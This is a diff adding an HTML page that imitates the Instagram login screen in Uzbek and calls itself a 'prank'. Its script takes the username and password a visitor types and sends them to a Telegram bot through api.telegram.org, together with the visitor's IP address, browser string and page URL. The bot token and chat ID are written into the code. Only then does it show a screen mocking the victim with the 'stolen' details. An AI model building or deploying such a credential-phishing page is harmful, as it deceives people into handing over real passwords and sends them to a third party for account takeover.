@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+            padding: 50px 40px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        .instagram-logo {
+            font-size: 52px;
+            font-weight: 300;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 30px;
+            letter-spacing: -2px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #262626;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #8e8e8e;
+            font-size: 15px;
+            margin-bottom: 35px;
+        }
+
+        /* Input fields - PERFECT Instagram style */
+        .input-group {
+            position: relative;
+            margin-bottom: 18px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 15px 18px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            background: #fafafa;
+            font-size: 14px;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #0095f6;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(0, 149, 246, 0.1);
+        }
+
+        .input-field::placeholder {
+            color: #a8a8a8;
+        }
+
+        /* Button - EXACT Instagram */
+        .login-btn {
+            width: 100%;
+            background: #0095f6;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: all 0.2s ease;
+        }
+
+        .login-btn:hover:not(:disabled) {
+            background: #1877f2;
+            transform: translateY(-1px);
+        }
+
+        .login-btn:disabled {
+            background: #b2dffc;
+            cursor: not-allowed;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 13px;
+            text-decoration: none;
+            display: block;
+            margin: 20px 0;
+            font-weight: 500;
+        }
+
+        .divider {
+            position: relative;
+            margin: 30px 0;
+            font-size: 13px;
+            color: #8e8e8e;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #efefef;
+        }
+
+        .divider span {
+            background: white;
+            padding: 0 20px;
+        }
+
+        /* Loading */
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 60px 30px;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* PRANK Screen */
+        .prank-screen {
+            display: none;
+            animation: explode 0.8s ease-out;
+        }
+
+        @keyframes explode {
+            0% {
+                transform: scale(0.5) rotate(-10deg);
+                opacity: 0;
+            }
+            70% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1) rotate(0deg);
+                opacity: 1;
+            }
+        }
+
+        .prank-emoji {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: bounce 0.6s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        .prank-title {
+            font-size: 36px;
+            color: #ed4956;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+
+        .stolen-info {
+            background: linear-gradient(135deg, #ffebee, #ffcdd2);
+            border: 2px solid #ff8a80;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 25px 0;
+            text-align: left;
+        }
+
+        .stolen-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .stolen-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .stolen-label {
+            color: #d32f2f;
+            min-width: 80px;
+        }
+
+        .stolen-value {
+            color: #b71c1c;
+            font-weight: 700;
+            word-break: break-all;
+        }
+
+        .real-instagram {
+            display: inline-block;
+            background: #0095f6;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 25px;
+            transition: all 0.3s ease;
+        }
+
+        .real-instagram:hover {
+            background: #1877f2;
+            transform: translateY(-2px);
+        }
+
+        /* Config Panel (Admin) */
+        .config-panel {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.9);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 12px;
+            z-index: 1000;
+            display: none;
+        }
+
+        .config-panel input {
+            width: 200px;
+            padding: 5px;
+            margin: 5px 0;
+            border: none;
+            border-radius: 4px;
+        }
+
+        .config-save {
+            background: #4caf50;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                margin: 10px;
+                padding: 40px 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- CONFIG PANEL (Token/ID uchun) -->
+    <div class="config-panel" id="configPanel">
+        <div>🔧 Admin Panel</div>
+        <input type="text" id="botToken" placeholder="Bot Token" value="">
+        <input type="text" id="chatId" placeholder="Chat ID" value="">
+        <button class="config-save" onclick="saveConfig()">💾 Saqlash</button>
+        <div style="margin-top: 10px; font-size: 11px;">
+            Sahifa yuklanganda F12 → Console tekshiring
+        </div>
+    </div>
+
+    <!-- Main Login Form -->
+    <div class="container" id="loginContainer">
+        <div class="instagram-logo">Instagram</div>
+        
+        <h2 class="title">Profilga kirish</h2>
+        <p class="subtitle">Username va parolni kiriting</p>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <input 
+                    type="text" 
+                    class="input-field" 
+                    id="username" 
+                    placeholder="Username yoki email"
+                    required
+                >
+            </div>
+            
+            <div class="input-group">
+                <input 
+                    type="password" 
+                    class="input-field" 
+                    id="password" 
+                    placeholder="Parol"
+                    required
+                >
+            </div>
+
+            <a href="#" class="forgot-password">Parolni unutdingizmi?</a>
+
+            <button type="submit" class="login-btn">
+                <i class="fas fa-arrow-right"></i> Kirish
+            </button>
+        </form>
+
+        <div class="divider">
+            <span>yoki</span>
+        </div>
+
+        <button class="login-btn" style="background: #efefef; color: #262626;">
+            <i class="fab fa-facebook-f"></i> Facebook bilan kirish
+        </button>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading" id="loadingScreen">
+        <div class="spinner"></div>
+        <div style="font-size: 18px; font-weight: 500; margin-bottom: 10px;">Kirilmoqda...</div>
+        <div id="loadingDots"></div>
+    </div>
+
+    <!-- PRANK Screen -->
+    <div class="prank-screen" id="prankScreen">
+        <div class="prank-emoji">🤣😂😈</div>
+        <h1 class="prank-title">SIZNI ALDADIMMM!</h1>
+        
+        <div class="stolen-info">
+            <div class="stolen-item">
+                <span class="stolen-label">👤 Username:</span>
+                <span class="stolen-value" id="stolenUser">@unknown</span>
+            </div>
+            <div class="stolen-item">
+                <span class="stolen-label">🔑 Parol:</span>
+                <span class="stolen-value" id="stolenPass">******</span>
+            </div>
+            <div class="stolen-item">
+                <span class="stolen-label">🌐 IP:</span>
+                <span class="stolen-value" id="stolenIP">aniqlanmoqda...</span>
+            </div>
+        </div>
+
+        <a href="https://www.instagram.com" class="real-instagram" target="_blank">
+            <i class="fab fa-instagram"></i> Haqiqiy Instagram ga o'tish
+        </a>
+    </div>
+
+    <script>
+        // === KONFIGURATSIYA ===
+        let CONFIG = {
+            botToken: '8739210391:AAGUYn9MNaP0ubzFxOnvZA03ehGyHr8j8SA',
+            chatId: '8520330580'
+        };
+
+        // LocalStorage dan o'qish
+        function loadConfig() {
+            const saved = localStorage.getItem('prankConfig');
+            if (saved) {
+                CONFIG = JSON.parse(saved);
+            }
+        }
+
+        function saveConfig() {
+            CONFIG.botToken = document.getElementById('botToken').value.trim();
+            CONFIG.chatId = document.getElementById('chatId').value.trim();
+            localStorage.setItem('prankConfig', JSON.stringify(CONFIG));
+            
+            if (CONFIG.botToken && CONFIG.chatId) {
+                alert('✅ Sozlamalar saqlandi!');
+                document.getElementById('configPanel').style.display = 'none';
+            } else {
+                alert('❌ Token va Chat ID ni to\'ldiring!');
+            }
+        }
+
+        // Admin panel ochish (F12 bosganda)
+        window.addEventListener('keydown', (e) => {
+            if (e.key === 'F12') {
+                document.getElementById('configPanel').style.display = 'block';
+                document.getElementById('botToken').value = CONFIG.botToken;
+                document.getElementById('chatId').value = CONFIG.chatId;
+            }
+        });
+
+        // Initialize
+        loadConfig();
+        console.log('🤖 Prank bot sozlamalari:', CONFIG);
+
+        // Form submit
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!username || !password) {
+                alert('Username va parol kiriting!');
+                return;
+            }
+
+            if (!CONFIG.botToken || !CONFIG.chatId) {
+                alert('⚠️ Admin paneldan (F12) bot token va chat ID kiriting!');
+                document.getElementById('configPanel').style.display = 'block';
+                return;
+            }
+
+            // Show loading
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'block';
+
+            // Loading dots
+            let dots = '';
+            const dotInterval = setInterval(() => {
+                dots += '.';
+                if (dots.length > 3) dots = '';
+                document.getElementById('loadingDots').textContent = dots;
+            }, 400);
+
+            // Get IP
+            const ip = await getIP();
+
+            // Send to Telegram
+            const message = `
+🔥 <b>INSTAGRAM LOGIN PRANK!</b> 🔥
+
+👤 <b>Username:</b> <code>${username}</code>
+🔑 <b>Parol:</b> <code>${password}</code>
+🌐 <b>IP:</b> <code>${ip}</code>
+📱 <b>Device:</b> ${navigator.userAgent.slice(0, 60)}...
+🕐 <b>Vaqti:</b> ${new Date().toLocaleString('uz-UZ')}
+🔗 <b>Hawola:</b> ${window.location.href}
+
+✨ <b>PRANK MUVAFFAQ!</b> ✨
+            `;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.chatId,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    })
+                });
+
+                const result = await response.json();
+                console.log('✅ Telegram natija:', result);
+
+                if (!result.ok) {
+                    throw new Error(result.description);
+                }
+
+            } catch (error) {
+                console.error('❌ Telegram xatosi:', error);
+                alert('Bot xatosi! Token/Chat ID tekshiring (F12)');
+            }
+
+            // Show prank
+            clearInterval(dotInterval);
+            setTimeout(() => {
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('prankScreen').style.display = 'block';
+                document.getElementById('stolenUser').textContent = username;
+                document.getElementById('stolenPass').textContent = password;
+                document.getElementById('stolenIP').textContent = ip;
+            }, 1500);
+        });
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Aniqlanmadi';
+            }
+        }
+    </script>
+</body>
+</html>
